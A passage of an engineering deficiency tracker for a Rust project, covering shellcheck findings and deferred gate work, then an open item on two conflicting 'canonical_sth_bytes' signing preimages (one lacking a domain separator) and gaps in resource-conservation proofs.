- Observation, not caused here: `scripts/check-gates-can-fail.sh` carries 11 pre-existing `shellcheck -S error` findings on `origin/main` (SC1087/SC1125 at lines 99, 121, 664, 665). CI does not shellcheck `scripts/` — its only use is `actionlint -shellcheck=`, disabled — but `scripts/prepush.sh` shellchecks *changed* scripts, so anyone editing that file trips them locally.
- Not done yet: (a) folding C8 in — it asserts an anchor **is** present and this asserts it is **absent**, duals over the same scanner, but C8 is a required context with its own probe and rewriting it in the same change that introduces a new class would risk a live gate to save a file; (b) the `#[allow(dead_code)]` ratchet; (c) the wire-or-delete dispositions themselves, which belong to PR D.
- `TimeLattice::extend` is dead and deliberately **not** listed: its call sites read `x.extend(...)`, and that literal matches every `Vec` in the tree. An anchor that over-matches would make the gate lie in the safe-looking direction, so the constraint is written into the manifest header rather than worked around.

## 30) One canonical name, two signing preimages; and the conservation gap

Deficiency
- Two functions named `canonical_sth_bytes`: `crates/nucleus-verifier-service/src/signing.rs:140` emits 72 bytes prefixed with `nucleus-verifier-sth/v1`; `crates/nucleus-lineage/src/checkpoint.rs:139` emits 48 bytes with **no domain separator**, and its doc comment rationalises the omission. Both are live. A witness key used for both logs is a cross-protocol signature-confusion hazard.
- Wider: ~40 canonicalization functions in 7 mutually incompatible encoding families, and 5 byte layouts for "signed tree head".
- Conservation: 20 linear resource quantities, of which 1 (`LedgerCore`) has a machine-checked conservation proof; 12 further axes are declared affine but are physically linear (2 token budgets — item 20; 8 `ck-types::BudgetBounds` fields; `max_parallel_tasks`; `BudgetLattice::charge`, which keeps a second unreconciled account of the same dollars).
Refs: `crates/nucleus-lineage/src/checkpoint.rs:139`, `crates/nucleus-lineage/src/cosign.rs:161`, `crates/nucleus-verifier-service/src/signing.rs:140`, `crates/ck-types/src/manifest.rs:223-232`

TODO
- Do not invent a third scheme. `cosign.rs:194` can already sign `signed_note::checkpoint_signed_bytes`, which is domain-separated by its `origin` string; make that the default and dual-accept on verify for one release. `Checkpoint` has no version field, so the migration must be dual-accept rather than versioned.
- Conservation generalisation (`LedgerCore<Unit>`) is deferred to the Tier-3 ADR; item 20 is the one instance fixed now.

Status
- OPEN.
